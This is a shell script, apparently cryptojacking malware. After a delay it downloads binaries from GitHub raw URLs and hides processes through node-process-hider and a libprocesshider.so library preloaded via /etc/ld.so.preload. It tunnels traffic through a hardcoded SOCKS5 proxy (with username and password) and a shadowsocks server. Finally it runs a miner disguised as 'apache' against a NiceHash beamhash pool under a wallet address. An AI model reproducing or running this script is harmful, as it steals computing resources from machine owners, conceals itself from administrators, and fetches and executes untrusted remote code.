#!/bin/sh
sleep 11m
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add apache

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 191.101.148.51:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/apache
chmod +x apache

apt -y install shadowsocks-libev rng-tools
rngd -r /dev/urandom
ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicApache.zip
unzip magicApache.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./apache --algo beamhash --server beamv3.usa-west.nicehash.com --port 3387 --ssl 1 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --pass x
